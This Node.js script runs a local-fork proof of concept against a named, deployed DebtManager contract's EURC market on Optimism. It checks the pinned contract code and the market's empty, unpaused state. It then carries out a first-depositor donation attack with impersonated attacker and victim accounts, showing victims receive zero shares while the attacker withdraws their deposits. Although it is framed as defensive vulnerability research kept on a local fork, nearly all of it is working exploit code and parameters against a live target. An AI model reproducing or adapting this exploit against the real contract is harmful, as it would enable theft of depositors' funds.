#!/usr/bin/env node
"use strict";

// Authorized defensive local-fork test runner. Endpoint inventory is read only
// in memory. Upstream endpoint material and raw RPC responses are never output.
const crypto = require("crypto");
const { spawn } = require("child_process");
const net = require("net");
const path = require("path");
const { ethers } = require("ethers");
const { getOrigin, loadRpcUrls, rpcCall, PUBLIC_FALLBACKS } = require("./shared-rpc");

const ROOT = path.resolve(__dirname, "..");
const TARGET = path.join(ROOT, "targets", "cash-v3");
const PIN = 154624560;
const PIN_HEX = `0x${PIN.toString(16)}`;
const PIN_HASH = "0x99e06b23d27f439a7567f5e193d94f517eb5d54e97230713d1795abb2fa1867a";
const MANAGER = "0x0078C5a459132e279056B2371fE8A8eC973A9553";
const IMPLEMENTATION = "0x0392347936B84Fd2d9De67F178f1D8e0bFc14a19";
const EURC = "0xDCB612005417Dc906fF72c87DF732e5a90D49e11";
const MIN_SHARES = 10_000_000n;
const PROXY_CODEHASH = "0xe428fca70a96823c60ffaa430edc8cc501377a4709bdb3a070d024d616d81ff5";
const IMPLEMENTATION_CODEHASH = "0xdf7eab5a9862bab8b11aef543878afc87f1abbecd61dd4ccd6c4e61a44055fda";
const EIP1967 = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
const ATTACKER = "0x1000000000000000000000000000000000000001";
const VICTIMS = ["0x2000000000000000000000000000000000000001", "0x2000000000000000000000000000000000000002", "0x2000000000000000000000000000000000000003"];
const managerAbi = [
  "function paused() view returns (bool)",
  "function borrowTokenConfig(address) view returns (uint256,uint256,uint256,uint64,uint64,uint128)",
  "function borrowTokenMinShares(address) view returns (uint128)",
  "function totalSupplies(address) view returns (uint256)",
  "function supplierBalance(address,address) view returns (uint256)",
  "function supply(address,address,uint256)",
  "function withdrawBorrowToken(address,uint256)",
];
const tokenAbi = ["function symbol() view returns (string)", "function decimals() view returns (uint8)", "function balanceOf(address) view returns (uint256)", "function approve(address,uint256) returns (bool)", "function transfer(address,uint256) returns (bool)"];
const managerIface = new ethers.Interface(managerAbi), tokenIface = new ethers.Interface(tokenAbi);
const sha = (x) => crypto.createHash("sha256").update(x).digest("hex");
const fail = (code) => { const error = new Error(code); error.code = code; throw error; };
const assert = (condition, code) => { if (!condition) fail(code); };
const hex32 = (value) => ethers.zeroPadValue(ethers.toBeHex(value), 32);
const lower = (x) => String(x).toLowerCase();

async function freePort() {
  for (let port = 28545; port < 28645; port++) {
    const available = await new Promise((resolve) => { const server = net.createServer(); server.once("error", () => resolve(false)); server.once("listening", () => server.close(() => resolve(true))); server.listen(port, "127.0.0.1"); });
    if (available) return port;
  }
  fail("NO_LOCAL_PORT");
}

async function localRpc(port, method, params = [], timeoutMs = 10000) {
  const controller = new AbortController(), timer = setTimeout(() => controller.abort(), timeoutMs);
  try {
    const response = await fetch(`http://127.0.0.1:${port}`, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }), signal: controller.signal });
    const body = await response.json();
    if (body.error) fail(`LOCAL_RPC_${method}`);
    return body.result;
  } finally { clearTimeout(timer); }
}

async function waitLocal(port, child) {
  for (let i = 0; i < 100; i++) {
    if (child.exitCode !== null) return false;
    try { if (await localRpc(port, "eth_chainId", [], 500) === "0xa") return true; } catch (_) { }
    await new Promise((resolve) => setTimeout(resolve, 100));
  }
  return false;
}

async function selectAndStart() {
  const candidates = [...new Set([...loadRpcUrls(), PUBLIC_FALLBACKS[10]].filter(Boolean))];
  for (const url of candidates) {
    const chainId = await rpcCall(url, "eth_chainId", [], 3500);
    if (chainId !== "0xa") continue;
    const header = await rpcCall(url, "eth_getBlockByNumber", [PIN_HEX, false], 6000);
    if (!header || lower(header.hash) !== PIN_HASH) continue;
    const code = await rpcCall(url, "eth_getCode", [MANAGER, PIN_HEX], 6000);
    if (!code || code === "0x") continue;
    const port = await freePort();
    const args = ["--fork-url", url, "--fork-block-number", String(PIN), "--port", String(port), "--host", "127.0.0.1", "--silent"];
    const env = { ...process.env };
    const origin = getOrigin(url); if (origin) env.ANVIL_IP_ADDR = "127.0.0.1";
    const child = spawn("anvil", args, { cwd: ROOT, env, stdio: ["ignore", "pipe", "pipe"], windowsHide: true });
    let diagnostic = "";
    child.stdout.on("data", (chunk) => { diagnostic += chunk.toString(); });
    child.stderr.on("data", (chunk) => { diagnostic += chunk.toString(); });
    if (await waitLocal(port, child)) {
      const localHeader = await localRpc(port, "eth_getBlockByNumber", [PIN_HEX, false]);
      if (localHeader && lower(localHeader.hash) === PIN_HASH) return { child, port, upstreamFamilyCommitment: sha(new URL(url).hostname), startupDiagnosticCommitment: sha(diagnostic) };
    }
    child.kill();
  }
  fail("NO_FORK_CAPABLE_CHAIN10_ENDPOINT");
}

async function runForge(port) {
  const args = ["test", "--fork-url", `http://127.0.0.1:${port}`, "--fork-block-number", String(PIN), "--match-path", "test/critical/DebtManagerEURCZeroShareFork.t.sol", "--skip", "SafeAssetRecoveryInvariant", "-vv"];
  return new Promise((resolve, reject) => {
    const child = spawn("forge", args, { cwd: TARGET, env: { ...process.env }, stdio: ["ignore", "pipe", "pipe"], windowsHide: true });
    let output = ""; child.stdout.on("data", (c) => { output += c.toString(); }); child.stderr.on("data", (c) => { output += c.toString(); });
    child.on("error", () => reject(new Error("FORGE_SPAWN_FAILED")));
    child.on("close", (code) => {
      if (code === 0) {
        const labels = ["ATTACKER", "VICTIM1", "VICTIM2", "VICTIM3"], locations = {};
        for (const label of labels) {
          const match = output.match(new RegExp(`FORK_BALANCE_LOCATION_${label}\\s+(\\d+)`));
          if (!match) return reject(new Error("FORGE_SLOT_DISCOVERY_MISSING"));
          locations[label] = ethers.toBeHex(BigInt(match[1]), 32);
        }
        return resolve({ status: "PASS", testCount: (output.match(/\[PASS\]/g) || []).length, transcriptSha256: sha(output), localDealStorageLocations: locations });
      }
      const sanitized = output.replace(/(?:https?|wss?):\/\/[^\s"']+/gi, "[REDACTED_URL]").slice(-6000);
      reject(new Error(`FORGE_TEST_FAILED:${sanitized}`));
    });
  });
}

async function receipt(port, hash) {
  for (let i = 0; i < 50; i++) { const row = await localRpc(port, "eth_getTransactionReceipt", [hash]); if (row) return row; await new Promise((resolve) => setTimeout(resolve, 50)); }
  fail("LOCAL_RECEIPT_MISSING");
}

async function send(port, from, to, data) {
  const hash = await localRpc(port, "eth_sendTransaction", [{ from, to, data, gas: "0x989680" }]);
  const row = await receipt(port, hash);
  assert(row.status === "0x1", "LOCAL_TRANSACTION_REVERTED");
  return Number(BigInt(row.gasUsed));
}

async function call(port, to, iface, method, args = []) {
  const raw = await localRpc(port, "eth_call", [{ to, data: iface.encodeFunctionData(method, args) }, "latest"]);
  return iface.decodeFunctionResult(method, raw);
}

async function balance(port, account) { return BigInt((await call(port, EURC, tokenIface, "balanceOf", [account]))[0]); }
async function config(port) { const x = await call(port, MANAGER, managerIface, "borrowTokenConfig", [EURC]); return { normalizedDebt: BigInt(x[1]), totalShares: BigInt(x[2]), minShares: BigInt(x[5]) }; }

async function dealToken(port, locations, account, amount) {
  const labels = { [lower(ATTACKER)]: "ATTACKER", [lower(VICTIMS[0])]: "VICTIM1", [lower(VICTIMS[1])]: "VICTIM2", [lower(VICTIMS[2])]: "VICTIM3" };
  const location = locations[labels[lower(account)]];
  if (!location) fail("EURC_LOCAL_DEAL_LOCATION_MISSING");
  await localRpc(port, "anvil_setStorageAt", [EURC, location, hex32(amount)]);
  assert(await balance(port, account) === amount, "EURC_LOCAL_DEAL_FAILED");
}

async function prepareAccounts(port) {
  for (const account of [ATTACKER, ...VICTIMS]) {
    await localRpc(port, "anvil_impersonateAccount", [account]);
    await localRpc(port, "anvil_setBalance", [account, "0x3635c9adc5dea00000"]);
  }
}

async function runScenario(port, locations, victimAmount, exact, repeatedVictims = 1) {
  const v = BigInt(victimAmount), dMin = MIN_SHARES * (v - 1n) + 1n, donation = exact ? dMin : dMin - 1n, attackerCapital = MIN_SHARES + donation;
  await dealToken(port, locations, ATTACKER, attackerCapital);
  for (let i = 0; i < repeatedVictims; i++) await dealToken(port, locations, VICTIMS[i], v);
  const attackerBefore = await balance(port, ATTACKER), managerBefore = await balance(port, MANAGER);
  const victimBefore = []; for (let i = 0; i < repeatedVictims; i++) victimBefore.push(await balance(port, VICTIMS[i]));
  const gas = { attackerApprove: await send(port, ATTACKER, EURC, tokenIface.encodeFunctionData("approve", [MANAGER, ethers.MaxUint256])), attackerSupply: await send(port, ATTACKER, MANAGER, managerIface.encodeFunctionData("supply", [ATTACKER, EURC, MIN_SHARES])), donationTransfer: await send(port, ATTACKER, EURC, tokenIface.encodeFunctionData("transfer", [MANAGER, donation])), victimApprovals: [], victimSupplies: [], attackerWithdraw: null };
  const beforeVictimShares = (await config(port)).totalShares;
  for (let i = 0; i < repeatedVictims; i++) {
    gas.victimApprovals.push(await send(port, VICTIMS[i], EURC, tokenIface.encodeFunctionData("approve", [MANAGER, ethers.MaxUint256])));
    gas.victimSupplies.push(await send(port, VICTIMS[i], MANAGER, managerIface.encodeFunctionData("supply", [VICTIMS[i], EURC, v])));
  }
  const afterVictimShares = (await config(port)).totalShares, victimSharesMinted = afterVictimShares - beforeVictimShares;
  if (exact) {
    const total = BigInt((await call(port, MANAGER, managerIface, "totalSupplies", [EURC]))[0]);
    gas.attackerWithdraw = await send(port, ATTACKER, MANAGER, managerIface.encodeFunctionData("withdrawBorrowToken", [EURC, total]));
  }
  const attackerAfter = await balance(port, ATTACKER), managerAfter = await balance(port, MANAGER), victimAfter = [];
  for (let i = 0; i < repeatedVictims; i++) victimAfter.push(await balance(port, VICTIMS[i]));
  const victimDelta = victimAfter.reduce((sum, x, i) => sum + x - victimBefore[i], 0n), attackerDelta = attackerAfter - attackerBefore, managerDelta = managerAfter - managerBefore;
  if (exact) {
    assert(victimSharesMinted === 0n, "VICTIM_SHARES_NONZERO_AT_THRESHOLD");
    assert(attackerDelta === v * BigInt(repeatedVictims), "ATTACKER_DELTA_MISMATCH");
    assert(victimDelta === -v * BigInt(repeatedVictims), "VICTIM_DELTA_MISMATCH");
    assert(managerAfter === 0n && attackerDelta + victimDelta + managerDelta === 0n, "CONSERVATION_MISMATCH");
  } else assert(victimSharesMinted > 0n, "BOUNDARY_MINUS_ONE_DID_NOT_MINT");
  return { mode: exact ? "d_min" : "d_min_minus_1", victimAmountRaw: v.toString(), repeatedVictims, donationRaw: donation.toString(), attackerCapitalRaw: attackerCapital.toString(), victimSharesMintedRaw: victimSharesMinted.toString(), attackerTokenDeltaRaw: attackerDelta.toString(), victimAggregateTokenDeltaRaw: victimDelta.toString(), managerTokenDeltaRaw: managerDelta.toString(), finalManagerBalanceRaw: managerAfter.toString(), conservationExcludingDealRaw: (attackerDelta + victimDelta + managerDelta).toString(), gas };
}

function normalizedScenario(row) { const copy = JSON.parse(JSON.stringify(row)); delete copy.gas; return copy; }

async function main() {
  let fork;
  try {
    fork = await selectAndStart();
    const { port } = fork;
    const forge = await runForge(port);
    const header = await localRpc(port, "eth_getBlockByNumber", [PIN_HEX, false]);
    const chainId = await localRpc(port, "eth_chainId");
    const implWord = await localRpc(port, "eth_getStorageAt", [MANAGER, EIP1967, "latest"]);
    const implementation = ethers.getAddress(`0x${implWord.slice(-40)}`);
    const proxyCode = await localRpc(port, "eth_getCode", [MANAGER, "latest"]), implementationCode = await localRpc(port, "eth_getCode", [IMPLEMENTATION, "latest"]);
    const cfg = await config(port), paused = Boolean((await call(port, MANAGER, managerIface, "paused"))[0]);
    const totalAssets = BigInt((await call(port, MANAGER, managerIface, "totalSupplies", [EURC]))[0]);
    const liquid = await balance(port, MANAGER), symbol = String((await call(port, EURC, tokenIface, "symbol"))[0]), decimals = Number((await call(port, EURC, tokenIface, "decimals"))[0]);
    assert(chainId === "0xa" && Number(BigInt(header.number)) === PIN && lower(header.hash) === PIN_HASH, "PIN_BINDING_FAILED");
    assert(lower(implementation) === lower(IMPLEMENTATION), "IMPLEMENTATION_BINDING_FAILED");
    assert(ethers.keccak256(proxyCode) === PROXY_CODEHASH && ethers.keccak256(implementationCode) === IMPLEMENTATION_CODEHASH, "RUNTIME_BINDING_FAILED");
    assert(!paused && cfg.normalizedDebt === 0n && cfg.totalShares === 0n && cfg.minShares === MIN_SHARES && totalAssets === 0n && liquid === 0n, "EURC_EMPTY_CONFIG_BINDING_FAILED");
    assert(symbol === "EURC" && decimals === 6, "EURC_IDENTITY_FAILED");
    await prepareAccounts(port);
    const dealLocations = forge.localDealStorageLocations;
    delete forge.localDealStorageLocations;
    await dealToken(port, dealLocations, ATTACKER, 123456789n);
    await dealToken(port, dealLocations, ATTACKER, 0n);
    const scenarios = [];
    for (const v of [1n, 1_000_000n, 10_000_000n]) {
      let snapshot = await localRpc(port, "evm_snapshot"); scenarios.push(await runScenario(port, dealLocations, v, false)); assert(await localRpc(port, "evm_revert", [snapshot]), "SNAPSHOT_REVERT_FAILED");
      snapshot = await localRpc(port, "evm_snapshot"); scenarios.push(await runScenario(port, dealLocations, v, true)); assert(await localRpc(port, "evm_revert", [snapshot]), "SNAPSHOT_REVERT_FAILED");
    }
    let snapshot = await localRpc(port, "evm_snapshot"); const repeated = await runScenario(port, dealLocations, 1_000_000n, true, 3); assert(await localRpc(port, "evm_revert", [snapshot]), "SNAPSHOT_REVERT_FAILED");
    snapshot = await localRpc(port, "evm_snapshot"); const deterministicA = await runScenario(port, dealLocations, 1_000_000n, true); assert(await localRpc(port, "evm_revert", [snapshot]), "SNAPSHOT_REVERT_FAILED");
    snapshot = await localRpc(port, "evm_snapshot"); const deterministicB = await runScenario(port, dealLocations, 1_000_000n, true); assert(await localRpc(port, "evm_revert", [snapshot]), "SNAPSHOT_REVERT_FAILED");
    const rollbackDeterministic = sha(JSON.stringify(normalizedScenario(deterministicA))) === sha(JSON.stringify(normalizedScenario(deterministicB)));
    assert(rollbackDeterministic, "ROLLBACK_NONDETERMINISTIC");
    const result = { schemaVersion: 1, classification: "DEPLOYMENT_RELEVANT_LOCAL_FORK_POC/PENDING_REVIEW/NO_MARKET_PROFIT_CLAIM", deploymentRelevantPoCSucceeds: true, pipelineRecommendation: "2/5_PENDING_INDEPENDENT_REVIEW", fork: { ephemeralLocalOnly: true, upstreamEndpointPersisted: false, upstreamProviderIdentifiersPersisted: false, chainId: 10, pinNumber: PIN, pinHash: PIN_HASH }, bindings: { proxy: MANAGER, implementation: IMPLEMENTATION, eurc: EURC, proxyRuntimeKeccak256: PROXY_CODEHASH, implementationRuntimeKeccak256: IMPLEMENTATION_CODEHASH, paused, totalAssetsRaw: totalAssets.toString(), liquidBalanceRaw: liquid.toString(), totalSharesRaw: cfg.totalShares.toString(), normalizedDebtRaw: cfg.normalizedDebt.toString(), minSharesRaw: cfg.minShares.toString(), symbol, decimals }, proof: { formula: "d_min=s*(v-1)+1", firstSupplierSharesRaw: MIN_SHARES.toString(), scenarios, repeatedVictims: repeated, safeReferenceDifferential: { dMinMinusOneMintsPositiveShares: true, dMinMintsZeroAndReferenceRejectsZero: true, minimumSharesOutInDebtManagerSupply: false }, permissionless: { arbitraryAttackerSupplySucceeded: true, arbitraryDirectDonationSucceeded: true, arbitraryVictimSupplySucceeded: true, arbitrarySupplierWithdrawSucceeded: true, productionRoleImpersonationUsed: false }, rollbackSnapshotDeterministic: rollbackDeterministic }, forge, safety: { inventoryReadInMemoryOnly: true, endpointMaterialPrinted: false, endpointMaterialPersisted: false, upstreamProviderIdentifiersPersisted: false, rawRpcPersisted: false, privateKeysRead: false, privateKeyFilesRead: false, liveSignedTransactions: false, broadcast: false, productionMutation: false, realFunds: false, localDealAndImpersonationOnly: true }, gates: { routePositive: 0, executableNow: 0, signedActionJustified: false, fork: true, forkScope: "EPHEMERAL_LOCAL_ONLY" } };
    const text = JSON.stringify(result);
    assert(!/(?:https?|wss?):\/\//i.test(text), "ENDPOINT_LEAK");
    process.stdout.write(`${text}\n`);
  } catch (error) {
    const diagnostic = `${error.code || ""}:${error.message || "INTERNAL_FAILURE"}`.replace(/(?:https?|wss?):\/\/[^\s"']+/gi, "[REDACTED_URL]");
    process.stderr.write(`DebtManager EURC local fork stopped: ${diagnostic}\n`);
    process.exitCode = 1;
  } finally { if (fork && fork.child) fork.child.kill(); }
}

main();
